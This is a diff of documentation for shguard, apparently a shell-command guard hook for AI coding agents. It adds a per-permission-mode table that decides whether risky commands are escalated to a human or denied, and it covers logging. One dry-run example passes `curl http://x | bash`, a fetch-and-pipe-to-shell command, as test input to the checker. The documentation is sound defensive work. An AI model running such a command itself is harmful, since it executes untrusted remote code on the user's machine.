@@ -891,6 +891,89 @@ regardless, so it is never mistaken for an ordinary policy decision.
 `escalation_floor`: there is no config mechanism that turns a genuine
 `Ask` into a silent `Allow`.
 
+### Per-mode ask outcome
+
+`ask_outcome = "deny"` above floors every terminal `Ask` for every hook
+call, whether a human is watching an interactive `default` session or an
+autonomous `auto`/`bypassPermissions` one. The operator requirement is
+narrower than that: an `Ask` should reach a human only when a human is
+actually in the loop, and floor to `deny` whenever it can't. Set
+`ask_outcome` to a table instead of a string to key the floor off the
+PreToolUse hook's own `permission_mode` field (issue #468):
+
+```toml
+[ask_outcome]
+default           = "ask"   # a human is watching; let the dialog through
+plan              = "ask"
+acceptEdits       = "ask"
+auto              = "deny"  # no human in the loop; floor to deny
+dontAsk           = "deny"
+bypassPermissions = "deny"
+subagent          = "deny"  # optional; see below
+```
+
+Every key uses the exact `permission_mode` stdin spelling (`default`,
+never `manual`); an unrecognized key fails config load closed, the same
+posture any other unrecognized config key gets. A key the table omits
+keeps the built-in default `"ask"`, so a table naming only `auto = "deny"`
+leaves every other mode at `"ask"`. `"allow"` is rejected in every slot,
+the same as the bare-string form.
+
+`subagent` is a separate, optional key: when the hook stdin carries an
+`agent_id` (a subagent call), its value overrides whatever the resolved
+`permission_mode` value would otherwise have been, in either direction, so
+`subagent = "ask"` can loosen a mode's own `"deny"` back to `"ask"` for
+subagent calls specifically, not only tighten it. When the table omits
+`subagent`, a subagent call resolves through the ordinary mode-keyed value
+with no override at all. It exists as its own key because neither the
+hooks doc nor `docs/threat-model.md`'s own measured matrix say anything
+subagent-specific about a PreToolUse `ask`; its actual harness behavior is
+unverified, tracked as a gap until someone measures it. It also applies
+independently of whether `permission_mode` itself is recognized: a
+subagent call under a mode this binary has never heard of still resolves
+through `subagent` rather than the `"ask"` fallback below, since agent-id
+presence and mode recognition are orthogonal.
+
+A `permission_mode` the hook stdin omits, or a value this binary doesn't
+recognize (a future harness mode), resolves to `"ask"` regardless of what
+the table configures for any *named* mode (`subagent`, above, is the one
+override that still applies on top of this): this binary has no basis for
+narrowing an autonomous-session floor to a mode it cannot identify.
+`shguard check` has no real hook stdin to read `permission_mode` from
+either, so it resolves the same conservative way unless its own
+`--permission-mode <mode>` flag is passed (issue #109's own dry-run mode,
+extended by #469):
+
+```sh
+shguard check 'curl http://x | bash' --permission-mode auto
+```
+
+parses `<mode>` with the exact same logic the hook stdin path uses, so a
+replay resolves a table-form `ask_outcome` identically to a real hook
+invocation carrying that `permission_mode`, and its `decision_log_path`
+line (if configured) matches the hook path's own line for the same
+command and mode. The bare-string form from the previous section is
+unaffected by any of this: it still floors every terminal `Ask`
+unconditionally, regardless of `permission_mode`/`agent_id`, exactly as
+before, since the operator who only ever runs one mode has no reason to
+migrate to the table form at all.
+
+A table-form `ask_outcome` also governs the composition root's own
+fail-closed paths, same as the bare-string form does, but resolved against
+whatever context each one has in hand: malformed/oversized stdin and a
+stdin read error never reach a parsed `permission_mode` at all, so they
+resolve the same conservative way an absent mode does (`"ask"` under a
+table; the bare-string `"deny"` form still applies unconditionally,
+regardless of context); a `Bash` payload missing its `command` field
+already has a readable `permission_mode` by that point, so it resolves
+against the actual mode the hook stdin carried, the same as a
+successfully-analyzed command would.
+
+Filtering a `decision_log_path` log for exactly the `Ask`s this table
+floored uses the same reason-based `jq` filter the bare-string form does
+(above), narrowed to one mode with `.permission_mode`:
+`jq 'select(.decision=="Block" and .matched_rule_id==null and .permission_mode=="auto")'`.
+
 ### Structured decision-output logging
 
 Off by default. shguard's own decision output today is only the hook
@@ -919,8 +1002,13 @@ unrecognized value logged as-is), `null` when the hook stdin omitted the
 field, which is distinct from a present `"default"`. `agent_id` is the
 subagent identifier the hook stdin carries when the call happened inside a
 subagent, `null` otherwise. Neither field affects the Allow/Ask/Block
-decision, and `shguard check` (no real hook stdin) always logs both as
-`null`. The file is opened in append mode (created if
+decision by itself, with one exception: a `[ask_outcome]` per-mode table
+(issue #469, "Per-mode ask outcome" below) keys the terminal-`Ask` floor
+off exactly these two fields. `shguard check` logs both as `null` unless
+its own `--permission-mode` flag is passed, in which case `permission_mode`
+logs that flag's value instead (`agent_id` still has no CLI equivalent, so
+it always logs `null` for `check`). The file is opened in append mode
+(created if
 missing with `0600` permissions — it records every evaluated command
 verbatim, which routinely contains inline secrets — never truncated), and
 a write failure — a missing parent directory, a full disk — is silently
